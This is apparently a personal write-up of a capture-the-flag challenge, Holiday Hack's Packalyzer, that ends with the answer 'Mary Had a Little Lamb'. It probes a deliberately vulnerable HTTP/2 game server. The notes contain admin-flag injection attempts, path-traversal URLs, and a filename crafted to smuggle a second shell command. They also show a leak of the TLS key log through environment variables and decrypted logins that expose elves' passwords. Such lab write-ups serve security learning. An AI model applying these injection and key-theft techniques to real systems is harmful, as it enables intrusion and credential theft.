# 8. Network Traffic Forensics

8) Network Traffic Forensics
> Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge.

1. Create an account and log into the system.
2. Play around.
3. Note the `Account` menu contains the info "Is Admin? False"
4. Try creating a new account with `is_admin=true`, `isAdmin=true` in the payload.
5. Captured traffic and then clicked on `Capture > Download` to get the captured PCAP.
6. Opened PCAP in WireShark. All in TLS.
7. The elf hits are:

> As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer.

> Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.

> Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code.

> There was suspicious-looking development code using environment variables to store SSL keys and open up directories.

> This elf then told me that manipulating values in the URL gave back weird and descriptive errors.

> I'm hoping these errors can't be used to compromise SSL on the website and steal logins.

> On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!
...

8. Burp does not speak HTTP/2

9. Interesting errors:

https://packalyzer.kringlecastle.com/uploads/.../...//...////ddd
Error: ENOENT: no such file or directory, open '/opt/http2/uploads//./././ddd'

curl 'https://packalyzer.kringlecastle.com/api/users' -H 'cookie: PASESSION=6834095383561688861509418561386' -H 'origin: https://packalyzer.kringlecastle.com' -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' -H 'accept: */*' -H 'referer: https://packalyzer.kringlecastle.com/' -H 'authority: packalyzer.kringlecastle.com' -H 'x-requested-with: XMLHttpRequest' --data 'is_admin=true' --compressed
500, TypeError: Cannot read property 'toLowerCase' of undefined

POST https://packalyzer.kringlecastle.com/api/sniff

curl -X POST https://packalyzer.kringlecastle.com/api/process -H 'cookie: PASESSION=6834095383561688861509418561386'  --data 'pcap=80144652_5-1-2019_5-56-26'



curl 'https://packalyzer.kringlecastle.com/api/list' -X POST -H 'cookie: PASESSION=6834095383561688861509418561386' -H 'origin: https://packalyzer.kringlecastle.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: fr,en-US;q=0.9,en;q=0.8,es;q=0.7' -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'accept: */*' -H 'referer: https://packalyzer.kringlecastle.com/' -H 'authority: packalyzer.kringlecastle.com' -H 'x-requested-with: XMLHttpRequest' -H 'content-length: 0' --compressed
{"request":true,
  "data":[
    "80144652_5-1-2019_5-56-26.pcap,80144652_5-1-2019_5-56-26,PUBLICDIR",
    "one_custom.pcap,upload_2fc71847b2a5daff1c152b3fbce0f1ca,PUBLICDIR"
    ]}

[nico@nickpad malware_analysis]$


https://packalyzer.kringlecastle.com/user/ Error: ENOENT: no such file or directory, open '/opt/http2http2/'


https://packalyzer.kringlecastle.com/dev/ > Error: EISDIR: illegal operation on a directory, read

So /dev/ is a directory ...

https://packalyzer.kringlecastle.com/dev/package.json


10. Uploaded `fake.pcap` and I've noticed the following:

```bash

curl 'https://packalyzer.kringlecastle.com/api/list' -X POST -H 'cookie: PASESSION=XXX' -H 'origin: https://packalyzer.kringlecastle.com' -H 'accept-encoding: gzip, deflate, br' -H 'accept-language: fr,en-US;q=0.9,en;q=0.8,es;q=0.7' -H 'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36' -H 'accept: */*' -H 'referer: https://packalyzer.kringlecastle.com/' -H 'authority: packalyzer.kringlecastle.com' -H 'x-requested-with: XMLHttpRequest' -H 'content-length: 0' --compressed | json_pp

{
   "request" : true,
   "data" : [
      "fake.pcap,upload_0fc42c762a937e31fee04de071feb0a6,PUBLICDIR"
   ]
}

```


11. Try to download `fake.pcap` and it does not work.


When getting `https://packalyzer.kringlecastle.com/uploads/path1/path2`, the server responds with `Error: ENOENT: no such file or directory, open '/opt/http2/uploads//path1/path2'`.

When uploading a pcap, it gets renamed as `upload_(hash).pcap`, becomes available at `https://packalyzer.kringlecastle.com/uploads/upload_(hash).pcap`, probably it gets moved to `/opt/http2/uploads/`, and a new JSON file apperas, named `upload_(hash).json`.


I assume the server runs

```bash
mv /path/to/file /opt/http2/uploads/upload_(hash).pcap
tshark -r /opt/http2/uploads/upload_(hash).pcap -T json > /opt/http2/uploads/upload_(hash).json
```


Try uploading a file named `one /opt/http2/uploads/funky ; mv /opt/http2/uploads/upload_0fc42c762a937e31fee04de071feb0a6.pcap` in such a way that the commands read:

```bash
mv /path/to/one /opt/http2/uploads/funky ; mv /opt/http2/uploads/upload_0fc42c762a937e31fee04de071feb0a6.pcap /opt/http2/uploads/upload_(hash).pcap
tshark -r /opt/http2/uploads/upload_(hash).pcap -T json > /opt/http2/uploads/upload_(hash).json
```

And see if there's a new file at https://packalyzer.kringlecastle.com/uploads/funky


12. Noticed a comment: `//File upload Function. All extensions and sizes are validated server-side in app.js`, so tried to get `https://packalyzer.kringlecastle.com/pub/app.js`, where you can find:

```JavaScript
const options = {
  key: fs.readFileSync(__dirname + '/keys/server.key'),
  cert: fs.readFileSync(__dirname + '/keys/server.crt'),
  http2: {
    protocol: 'h2',         // HTTP2 only. NOT HTTP1 or HTTP1.1
    protocols: [ 'h2' ],
  },
  keylog : key_log_path     //used for dev mode to view traffic. Stores a few minutes worth at a time
};



```


https://packalyzer.kringlecastle.com/pub/app.js


```

  //Route for anything in the public folder except index, home and register
router.get(env_dirs,  async (ctx, next) => {
try {
    var Session = await sessionizer(ctx);
    //Splits into an array delimited by /
    let split_path = ctx.path.split('/').clean("");
    //Grabs directory which should be first element in array
    let dir = split_path[0].toUpperCase();
    split_path.shift();
    let filename = "/"+split_path.join('/');
    while (filename.indexOf('..') > -1) {
    filename = filename.replace(/\.\./g,'');
    }
    if (!['index.html','home.html','register.html'].includes(filename)) {
    ctx.set('Content-Type',mime.lookup(__dirname+(process.env[dir] || '/pub/')+filename))
    ctx.body = fs.readFileSync(__dirname+(process.env[dir] || '/pub/')+filename)
    } else {
    ctx.status=404;
    ctx.body='Not Found';
    }
} catch (e) {
    ctx.body=e.toString();
}
});
```

Need to get the values of the following ENV variables:
```
/*
DEV
SSLKEYLOGFILE
*/

const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )


// dirs = [ /process.env.DEV/ ,  /process.env.SSLKEYLOGFILE/ ]

```

13. If the `SSLKEYLOGFILE` environment variable could somehow be read we'd get the file name of the keys..


14. Because of `ctx.set('Content-Type',mime.lookup(__dirname+(process.env[dir] || '/pub/')+filename))` ; calling a path with the variable name (in lowercase) will show a very interesting error:

```
https://packalyzer.kringlecastle.com/sslkeylogfile/
Error: ENOENT: no such file or directory, open '/opt/http2packalyzer_clientrandom_ssl.log/'
```

So the filename is `packalyzer_clientrandom_ssl.log`. Download the file from `/dev/packalyzer_clientrandom_ssl.log`

https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log



15. Use the keys to decrypt the traffic from the tool. Edit, preferences, protocols, SSL. Use the keys file.
Need to sniff traffic and use the corresponding keys at the same time; get a few versions of https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log while you capture traffic.


16. Look around for the login request, and find:

```
10.126.0.104: {"username": "alabaster", "password": "Packer-p@re-turntable192"}
```


17. Keep looking around to solve the actual challenge; so try to find the name of the song sent by Holly Evergreen to Alabaster Snowball;

18. Alabaster's login request was done from `10.126.0.104` to `10.126.0.3` ; so Alabaster's IP is `10.126.0.104`.

There's another successful login from `10.126.0.105`:
```
10.126.0.105 : {"username": "pepper", "password": "Shiz-Bamer_wabl182"}
10.126.0.106 : {"username": "bushy", "password": "Floppity_Floopy-flab19283"}
```

19. Login in the app as `alabster:Packer-p@re-turntable192` and download the `Super secret packet capture.pcap`. Open it with WireShark. There will be some SMTP traffic, where we'll need to find the attached document.


```
28	25.554416	10.10.1.1	10.10.1.25	SMTP	117	C: MAIL FROM:<Holly.evergreen@mail.kringlecastle.com>
32	35.698508	10.10.1.1	10.10.1.25	SMTP	118	C: RCPT TO:<alabaster.snowball@mail.kringlecastle.com>
```

20. Try to rebuild the email in order to get the document, in order to get the name of the song.

> Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.


21. Filter the interesting packets with `ip.src_host=="10.10.1.1" && smtp`. Right click on the packet and select Follow TCP Stream. Get the base64 and save it as `attachment.base64`

22. Decode it and investigate:
```
cat attachment.base64 | base64 -d >attachment
[nico@nickpad http2]$ file attachment
attachment: PDF document, version 1.5
```

23. Rename it to `attachment.pdf`, read it and find: 'Mary Had a Little Lamb' at the end. That's the answer.

> What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?

> Mary Had a Little Lamb

24. Bonus track, [provided a small nodejs script}(../scripts/http2/index.js) to proxy http2 to a http1/1 client. I've used it to run DirBuster on the http2 server.
